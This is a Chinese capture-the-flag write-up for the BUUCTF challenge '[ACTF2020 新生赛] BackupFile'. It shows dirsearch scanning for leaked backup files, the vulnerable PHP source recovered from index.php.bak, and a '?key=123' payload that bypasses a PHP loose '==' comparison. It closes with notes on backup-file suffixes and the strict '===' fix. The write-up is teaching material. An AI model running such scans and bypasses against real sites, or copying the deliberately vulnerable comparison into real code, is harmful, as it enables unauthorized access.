---
title: "12-CTF WriteUp: [ACTF2020 新生赛] BackupFile"
date: 2026-05-06
categories:
  - BUUCTF
  - WEB
tags:
  - web
aliases:
  - 备份文件泄露
---

## 题目信息

- 题目名称：[ACTF2020 新生赛]BackupFile
- 考点：**备份文件泄露**、**PHP 弱类型比较绕过（==）**
- 难度：入门

## 解题步骤

### 步骤1：访问题目页面

```bash
curl -s -i "http://4d0b75ad-5dec-45ed-8f57-54f07ecc803c.node5.buuoj.cn:81/"
```

页面返回：`Try to find out source file!`，提示需要找到源码文件。

### 步骤2：使用 dirsearch 扫描备份文件

题目名 "BackupFile" 暗示存在备份文件泄露。使用 dirsearch 工具扫描常见备份后缀：

```bash
python dirsearch.py -u http://4d0b75ad-5dec-45ed-8f57-54f07ecc803c.node5.buuoj.cn:81/ \
  -e bak,swp,php~,old,orig,phps,tar.gz,zip,rar
```

扫描结果发现 `index.php.bak` 返回 200，存在备份文件泄露。

> 注：不能预先假设文件名就是 `index.php`。dirsearch 会爆破常见的 Web 文件名（如 `index.php`、`admin.php`、`config.php` 等）并拼接指定后缀，从而发现泄露的备份文件。也可以使用御剑、gobuster 等工具替代 dirsearch。

### 步骤3：下载备份文件，获取源码

```bash
curl -s "http://4d0b75ad-5dec-45ed-8f57-54f07ecc803c.node5.buuoj.cn:81/index.php.bak"
```

得到源码：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
?>
```

### 步骤4：代码审计

核心逻辑：

1. 接收 GET 参数 `key`
2. `is_numeric($key)` → 必须为数字，否则输出 `Just num!` 并退出
3. `intval($key)` → 转为整数
4. `$key == $str` → **弱类型比较（`==`）**，成立则输出 flag

`$str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"` 以 `123` 开头，在 `==` 弱比较下转为整数 `123`。

只需 `intval($key) == 123` 即可绕过。

### 步骤5：构造 payload 获取 flag

```bash
curl -s "http://4d0b75ad-5dec-45ed-8f57-54f07ecc803c.node5.buuoj.cn:81/?key=123"
```

输出 flag：`flag{5913e0c3-cb96-4618-92cc-6b64c328318d}`

## 知识点总结

### 1. dirsearch 目录扫描

dirsearch 是 CTF Web 入门必备工具，用于爆破网站目录和文件：

```bash
# 常用命令
python dirsearch.py -u <URL> -e <后缀列表>

# 常用后缀：php,html,js,txt,bak,swp,zip,tar.gz,git,svn,old,orig,~
```

### 2. 备份文件泄露

常见源码备份文件后缀：

| 后缀 | 来源 |
|------|------|
| `.bak` | 手动备份 |
| `.swp` / `.swo` | Vim 编辑时的交换文件 |
| `.php~` | gedit/kate 等编辑器备份 |
| `.old` | 旧版本重命名 |
| `.orig` | patch/diff 原始文件 |
| `.phps` | PHP 语法高亮源文件 |
| `.git/` | Git 版本控制泄露 |
| `.svn/` | SVN 版本控制泄露 |

### 3. PHP 弱类型比较（`==`）

PHP 的 `==` 运算符在比较不同类型的值时，会进行**类型转换**（Type Juggling）：

```php
123 == "123abc"  // true，"123abc" 转为整数 123
0 == "abc"       // true（PHP 8.0 前），"abc" 转为整数 0
"0e123" == "0e456"  // true，科学计数法 0 的 N 次方 = 0
```

**防御方式**：使用严格比较 `===`，它不会进行类型转换。

### 4. 相关函数

- `is_numeric()`：检查变量是否为数字或数字字符串
- `intval()`：将变量转为整数，非数字字符串开头的部分会被截断
